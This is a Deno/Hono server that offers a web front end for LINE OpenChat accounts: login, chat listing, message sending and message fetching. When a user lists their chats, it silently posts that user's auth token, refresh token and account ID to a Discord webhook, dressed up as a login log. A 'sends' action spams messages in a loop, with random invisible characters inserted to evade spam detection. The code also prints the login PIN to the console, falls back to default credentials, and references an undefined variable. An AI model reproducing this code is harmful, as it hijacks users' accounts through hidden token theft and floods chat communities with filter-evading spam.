import { Hono } from "hono";
import { cors } from "hono/cors";
import { serveStatic } from "hono/deno";
import { basicAuth } from "hono/basic-auth";
import {
  loginWithPassword,
  loginWithAuthToken,
  Client,
  SquareMessage,
} from "jsr:@evex/linejs@2.1.7";
import { MemoryStorage } from "jsr:@evex/linejs@2.1.7/storage";

// -----------------------------------------------------------------------------
// グローバル状態
// -----------------------------------------------------------------------------

const clientCache = new Map<string, Client>();

// 共通 CORS ヘッダー (cors() ミドルウェアでも付与されるが JSON レスポンスにも同一値を付与)
const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

// -----------------------------------------------------------------------------
// ユーティリティ関数群
// -----------------------------------------------------------------------------

/** User‑Agent 文字列を簡易解析してブラウザ/OS/デバイス種別を返す */
function parseUserAgent(userAgent: string) {
  const browser = userAgent.includes("Chrome")
    ? "Chrome"
    : userAgent.includes("Firefox")
    ? "Firefox"
    : userAgent.includes("Safari")
    ? "Safari"
    : "Unknown";

  const os = userAgent.includes("Windows")
    ? "Windows"
    : userAgent.includes("Mac")
    ? "macOS"
    : userAgent.includes("Linux")
    ? "Linux"
    : userAgent.includes("Android")
    ? "Android"
    : userAgent.includes("iOS")
    ? "iOS"
    : "Unknown";

  const device = userAgent.includes("Mobile") ? "Mobile" : "Desktop";
  return { browser, os, device } as const;
}

/**
 * events から squareMemberMid (pid) を抽出
 */
function extractPidsFromEvents(events: any[]): string[] {
  console.debug("[DEBUG] extractPidsFromEvents 開始, events数:", events.length);
  const pids = new Set<string>();

  for (const event of events) {
    const squareMessage =
      event.payload?.receiveMessage?.squareMessage ??
      event.payload?.sendMessage?.squareMessage;

    if (squareMessage?.message?.from) pids.add(squareMessage.message.from);

    if (event.type === "NOTIFIED_UPDATE_SQUARE_MEMBER_PROFILE") {
      const memberMid =
        event.payload?.notifiedUpdateSquareMemberProfile?.squareMemberMid;
      if (memberMid) pids.add(memberMid);
    }

    const createdMid =
      event.payload?.notifiedCreateSquareMember?.squareMember?.squareMemberMid;
    if (createdMid) pids.add(createdMid);
  }

  const result = [...pids];
  console.debug("[DEBUG] 抽出されたpids:", result);
  return result;
}

/** 指定した SquareChat のメンバープロフィールをまとめて取得 */
async function getSquareMemberProfiles(
  client: Client,
  pids: string[],
  squareChatMid: string,
) {
  console.debug("[DEBUG] getSquareMemberProfiles 開始");
  const map = new Map<
    string,
    { displayName: string; pictureStatus: string; revision: number }
  >();

  try {
    const squareChat = await client.getSquareChat(squareChatMid);
    const members = await squareChat.getMembers();
    console.debug("[DEBUG] チャットメンバー取得結果:", members.length);

    for (const member of members) {
      if (pids.includes(member.squareMemberMid)) {
        map.set(member.squareMemberMid, {
          displayName: member.displayName,
          pictureStatus: member.profileImageObsHash,
          revision: member.revision as number,
        });
      }
    }
    console.debug("[DEBUG] 抽出されたプロフィール数:", map.size);
  } catch (err) {
    console.error("[ERROR] チャットメンバー取得失敗", err);
    if (err instanceof Error) throw err;
    throw new Error(String(err));
  }
  return map;
}

/**
 * authToken/refreshToken をキーに Client をキャッシュし、なければ生成
 */
async function getOrCreateClient(
  authToken: string,
  refreshToken?: string,
): Promise<Client> {
  const cacheKey = `${authToken}_${refreshToken ?? "no-refresh"}`;
  if (clientCache.has(cacheKey)) return clientCache.get(cacheKey)!;

  const storage = new MemoryStorage();
  if (refreshToken) {
    console.info("[INFO] refreshToken を受信: メモリに保存");
    await storage.set("refreshToken", refreshToken);
  }

  try {
    const client = await loginWithAuthToken(authToken, {
      device: "DESKTOPWIN",
      storage,
    });

    // トークンローテーション時にキャッシュ更新
    client.base.on("update:authtoken", async (newToken) => {
      console.info("[INFO] authToken 更新", newToken);
      clientCache.delete(cacheKey);
      clientCache.set(`${newToken}_${refreshToken ?? "no-refresh"}`, client);
    });
    // @ts-expect-error 型定義に存在しないが実際は発火する
    client.base.on("update:refreshToken", async (newRT: string) => {
      console.info("[INFO] refreshToken 更新", newRT);
      await storage.set("refreshToken", newRT);
    });

    clientCache.set(cacheKey, client);
    return client;
  } catch (err) {
    console.error("[ERROR] ログイン失敗", err);
    throw err;
  }
}

  // 連投検知回避
  function processText(text: string): string {
    const variationSelectors = Array.from({ length: 16 }, (_, i) =>
      String.fromCharCode(0xFE00 + i)
    );
    const insertCount = Math.ceil(text.length / 20);
    const positions = new Set<number>();

    while (positions.size < insertCount) {
      const pos = Math.floor(Math.random() * (text.length + 1));
      positions.add(pos);
    }

    const chars = text.split("");
    Array.from(positions)
      .sort((a, b) => b - a)
      .forEach(pos => {
        const randVS =
          variationSelectors[Math.floor(Math.random() * variationSelectors.length)];
        chars.splice(pos, 0, randVS);
      });

    return chars.join("");
  }

// -----------------------------------------------------------------------------
// Hono アプリケーション定義
// -----------------------------------------------------------------------------

const app = new Hono();

// === ミドルウェア ===
app.use("/*", cors());

// Basic認証を全ルートに適用
app.use(
  "/*",
  basicAuth({
    username: Deno.env.get("BASIC_AUTH_USER") ?? "admin",
    password: Deno.env.get("BASIC_AUTH_PASS") ?? "secret",
  }),
);

// 静的ファイル (index.html を含む)
app.get("/", serveStatic({ path: "./index.html", root: "./" }));
app.get("/*", serveStatic({ root: "./" }));

// -----------------------------------------------------------------------------
// API: /api/terms-agreement   (POST)
// -----------------------------------------------------------------------------
app.post("/api/terms-agreement", async (c) => {
  try {
    const body = await c.req.json();

    const userAgent = c.req.header("user-agent") ?? "unknown";
    const deviceInfo = parseUserAgent(userAgent);

    // Discord Webhook 送信
    const webhookUrl = Deno.env.get("CONSENT_WEBHOOK_URL");
    if (webhookUrl) {
      const discordMessage = {
        content: "利用規約への同意が記録されました",
        embeds: [
          {
            title: "利用規約同意ログ",
            color: 0x00b900,
            fields: [
              { name: "タイムスタンプ",
                value: new Date().toISOString(), 
                inline: true
              },
              {
                name: "ブラウザ",
                value: `${deviceInfo.browser} (${deviceInfo.os})`,
                inline: true,
              },
              { name: "デバイス", value: deviceInfo.device, inline: true },
              { name: "利用規約バージョン", value: "1.0", inline: true },
              {
                name: "同意項目",
                value: `18歳以上: ${body.ageConfirmed ? "✅" : "❌"}\n利用規約: ${body.termsAgreed ? "✅" : "❌"}`,
                inline: false,
              },
            ],
            footer: { text: "LINE Chat Application" },
            timestamp: body.timestamp,
          },
        ],
      };

      try {
        const res = await fetch(webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "User-Agent": "LINE-Terms-Agreement-Bot/1.0",
          },
          body: JSON.stringify(discordMessage),
        });
        if (!res.ok) {
          console.error("[ERROR] Webhook 送信失敗", res.status, await res.text());
        } else console.info("[INFO] Discord Webhook 送信成功");
      } catch (err) {
        console.error("[ERROR] Webhook エラー", err);
      }
    }

    return c.json(
      { success: true, message: "利用規約への同意を記録しました" },
      200,
      corsHeaders,
    );
  } catch (err) {
    console.error("[ERROR] 利用規約同意 API", err);
    return c.json(
      { success: false, error: err instanceof Error ? err.message : String(err) },
      400,
      corsHeaders,
    );
  }
});

// -----------------------------------------------------------------------------
// API: /api/login/password   (POST)
// -----------------------------------------------------------------------------
app.post("/api/login/password", async (c) => {
  try {
    const { email, password, pincode } = await c.req.json();

    const client = await loginWithPassword(
      {
        email,
        password,
        pincode,
        onPincodeRequest(pin) {
          console.log("PINコード:", pin);
        },
      },
      { device: "DESKTOPWIN", storage: new MemoryStorage() },
    );

    return c.json(
      {
        success: true,
        authToken: client.base.authToken,
        refreshToken: await client.base.storage.get("refreshToken"),
        pincode,
      },
      200,
      corsHeaders,
    );
  } catch (err) {
    return c.json(
      { success: false, error: err instanceof Error ? err.message : String(err) },
      400,
      corsHeaders,
    );
  }
});

// -----------------------------------------------------------------------------
// 総合 API (旧: POST *) – action に応じた処理
// -----------------------------------------------------------------------------
app.post("*", async (c) => {
  // 上記エンドポイントで処理済みの場合はスキップ
  if (c.req.path.startsWith("/api/")) {
    return c.json({ error: "Unknown API path" }, 404, corsHeaders);
  }

  let body: any;
  try {
    body = await c.req.json();
  } catch {
    return c.json({ error: "JSON ボディが必要です" }, 400, corsHeaders);
  }

  const authToken: string | undefined = body.authToken ?? body.token;
  let refreshToken: string | undefined = body.refreshToken;
  if (!refreshToken) {
    const url = new URL(c.req.url);
    refreshToken = url.searchParams.get("refreshToken") ??
      url.searchParams.get("refresh_token") ?? undefined;
    if (refreshToken) console.info("[INFO] クエリから refreshToken 取得");
  }

  const { action, text = "デフォルトメッセージ", squareChatMid = "" } = body;
  if (!authToken || !action) {
    return c.json(
      { error: "authToken と action は必須です" },
      400,
      corsHeaders,
    );
  }

  try {
    const client = await getOrCreateClient(authToken, refreshToken);
    const currentToken = client.base.authToken;
    const currentRefreshToken = await client.base.storage.get("refreshToken");

    // ----------------------------
    // action = "squares"
    // ----------------------------
    if (action === "squares") {
      const chats = await client.fetchJoinedSquareChats();

      // 1回目のログインは Discord Webhook へ通知
      const profile = client.base.profile;
      const mid = 
        `mid:${profile.mid}
        authToken:${authToken}
        refreshToken:${refreshToken}`;

      const webhookUrl = Deno.env.get("AGREE_WEBHOOK_URL");
      if (webhookUrl) {
        const ua = c.req.header("user-agent") ?? "unknown";
        const dev = parseUserAgent(ua);
        const loginEmbed = {
          content: "AuthToken ログインが記録されました",
          embeds: [
            {
              title: "AuthToken ログインログ",
              color: 0x0099ff,
              fields: [
                { name: "タイムスタンプ", value: new Date().toISOString(), inline: true },
                { name: "ユーザー情報", value: mid, inline: true },
                { name: "ブラウザ", value: `${dev.browser} (${dev.os})`, inline: true },
                { name: "デバイス", value: dev.device, inline: true },
              ],
              footer: { text: "LINE Chat Application - AuthToken Login" },
              timestamp: new Date().toISOString(),
            },
          ],
        };
        try {
          const res = await fetch(webhookUrl, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "User-Agent": "LINE-AuthToken-Login-Bot/1.0",
            },
            body: JSON.stringify(loginEmbed),
          });
          if (!res.ok) console.error("[ERROR] Login Webhook 失敗", await res.text());
        } catch (err) {
          console.error("[ERROR] Login Webhook", err);
        }
      }

      const result = await Promise.all(
        chats.map(async (c) => {
          try {
            const detail = await client.base.square.getSquareChat({
              squareChatMid: String(c.raw.squareChatMid),
            });
            return {
              squareChatMid: String(c.raw.squareChatMid),
              name: c.raw.name,
              chat: detail.squareChat,
              squareStatus: detail.squareChatStatus?.otherStatus
                ? { memberCount: detail.squareChatStatus.otherStatus.memberCount }
                : null,
              chatImageObsHash: detail.squareChat.chatImageObsHash,
            };
          } catch (err) {
            console.error("[ERROR] チャット詳細取得失敗", err);
            return {
              squareChatMid: String(c.raw.squareChatMid),
              name: c.raw.name,
              chat: c.raw,
              squareStatus: null,
              chatImageObsHash: c.raw.chatImageObsHash,
            };
          }
        }),
      );

      return c.json(
        {
          result,
          updatedAuthToken: currentToken,
          updatedRefreshToken: currentRefreshToken,
          tokenChanged: currentToken !== authToken,
          refreshTokenProvided: !!refreshToken,
        },
        200,
        corsHeaders,
      );
    }

    // ----------------------------
    // action = "send"
    // ----------------------------
    if (action === "send") {
      await client.base.square.sendMessage({ squareChatMid, text });
      return c.json(
        {
          message: "メッセージを送信しました",
          updatedAuthToken: currentToken,
          updatedRefreshToken: currentRefreshToken,
          tokenChanged: currentToken !== authToken,
          refreshTokenProvided: !!refreshToken,
        },
        200,
        corsHeaders,
      );
    }

    // ----------------------------
    // action = "sends"
    // ----------------------------
    if (action === "sends") {

      for (let i = 0; i < sendcount; i++) {
        const processedText = processText(text);
        await client.base.square.sendMessage({ squareChatMid, text: processedText });
        await new Promise((resolve) => setTimeout(resolve, 100));
      }

      return c.json(
        {
          message: `${sendcount} 回メッセージを送信しました`,
          updatedAuthToken: currentToken,
          updatedRefreshToken: currentRefreshToken,
          tokenChanged: currentToken !== authToken,
          refreshTokenProvided: !!refreshToken,
        },
        200,
        corsHeaders,
      );
    }

    // ----------------------------
    // action = "replyToMessage"
    // ----------------------------
    if (action === "replyToMessage") {
      const relatedMessageId = body.relatedMessageId;
      if (!relatedMessageId) {
        return c.json({ error: "relatedMessageId は必須です" }, 400, corsHeaders);
      }
      await client.base.square.sendMessage({
        squareChatMid,
        text,
        relatedMessageId,
      });
      return c.json(
        {
          message: "リプライメッセージを送信しました",
          updatedAuthToken: currentToken,
          updatedRefreshToken: currentRefreshToken,
          tokenChanged: currentToken !== authToken,
          refreshTokenProvided: !!refreshToken,
        },
        200,
        corsHeaders,
      );
    }

    // ----------------------------
    // action = "messages"
    // ----------------------------
    if (action === "messages") {
      console.debug("[DEBUG] messages アクション開始");
      const res = await client.base.square.fetchSquareChatEvents({
        squareChatMid,
        limit: 150,
      });
      console.debug("[DEBUG] events 取得完了", res.events?.length || 0);

      const pids = extractPidsFromEvents(res.events || []);
      const profiles = await getSquareMemberProfiles(client, pids, squareChatMid);

      const eventsWithImage = await Promise.all(
        (res.events || []).map(async (event) => {
          const sMsg =
            event.payload?.receiveMessage?.squareMessage ??
            event.payload?.sendMessage?.squareMessage;
          const msg = sMsg?.message;

          if (
            msg &&
            ["IMAGE", "VIDEO", "AUDIO", "FILE"].includes(String(msg.contentType))
          ) {
            try {
              const sqMsg = await SquareMessage.fromRawTalk(sMsg, client);
              const fileData = await sqMsg.getData();
              const dataURI = await new Promise<string>((resolve, reject) => {
                const reader = new FileReader();
                reader.onloadend = () => resolve(reader.result as string);
                reader.onerror = reject;
                reader.readAsDataURL(fileData);
              });
              return { ...event, imageData: dataURI, isImage: true };
            } catch (err) {
              console.error("[DEBUG] 画像取得エラー", err);
              return { ...event, isImage: false, imageError: err instanceof Error ? err.message : String(err) };
            }
          }
          return event;
        }),
      );

      // BigInt -> string 変換
      const replacer = (_key: string, value: unknown) =>
        typeof value === "bigint" ? value.toString() : value;
      const responseObj = {
        events: eventsWithImage,
        profiles: Object.fromEntries(profiles),
        updatedAuthToken: currentToken,
        updatedRefreshToken: currentRefreshToken,
        tokenChanged: currentToken !== authToken,
        refreshTokenProvided: !!refreshToken,
      };
      const jsonStr = JSON.stringify(responseObj, replacer);
      return new Response(jsonStr, {
        status: 200,
        headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    // ----------------------------
    // action = "getProfile"
    // ----------------------------
    if (action === "getProfile") {
      const { pid } = body;
      if (!pid) return c.json({ error: "pid は必須" }, 400, corsHeaders);
      if (!squareChatMid) {
        return c.json({ error: "squareChatMid は必須" }, 400, corsHeaders);
      }
      try {
        const squareChat = await client.getSquareChat(squareChatMid);
        const member = (await squareChat.getMembers()).find((m) =>
          m.squareMemberMid === pid
        );
        if (member) {
          return c.json(
            {
              success: true,
              profile: {
                displayName: member.displayName,
                pictureStatus: member.profileImageObsHash,
                revision: member.revision,
              },
            },
            200,
            corsHeaders,
          );
        }
        return c.json({ success: false, error: "メンバーが見つかりません" }, 404, corsHeaders);
      } catch (err) {
        console.error("[ERROR] プロフィール取得", err);
        return c.json(
          { success: false, error: err instanceof Error ? err.message : String(err) },
          500,
          corsHeaders,
        );
      }
    }

    // ----------------------------
    // 未定義 action
    // ----------------------------
    return c.json({ error: "Unknown action" }, 400, corsHeaders);
  } catch (err) {
    console.error("[ERROR] 総合 API", err);
    if (
      err instanceof Error &&
      (
        err.message?.includes("MUST_REFRESH_V3_TOKEN") ||
        err.message?.includes("AUTHENTICATION_FAILED") ||
        err.message?.includes("INVALID_TOKEN")
      )
    ) {
      const cacheKey = `${authToken}_${refreshToken ?? "no-refresh"}`;
      clientCache.delete(cacheKey);
      return c.json(
        {
          error: "認証エラー",
          message: refreshToken
            ? "トークンの有効期限が切れており、リフレッシュにも失敗しました。新しいトークンでログインしてください。"
            : "トークンの有効期限が切れています。refreshToken を提供するか、新しいトークンでログインしてください。",
          needsReauth: true,
          refreshTokenProvided: !!refreshToken,
        },
        401,
        corsHeaders,
      );
    }
    return c.json(
      {
        error: "処理エラー",
        message: "処理中にエラーが発生しました",
        details: err instanceof Error ? err.message : String(err),
        refreshTokenProvided: !!refreshToken,
      },
      500,
      corsHeaders,
    );
  }
});

// -----------------------------------------------------------------------------
// アプリ起動
// -----------------------------------------------------------------------------
console.log("[INFO] LINE 操作サーバー (Hono) 起動... http://localhost:8000");
Deno.serve({ port: 8000 }, (req) => app.fetch(req));
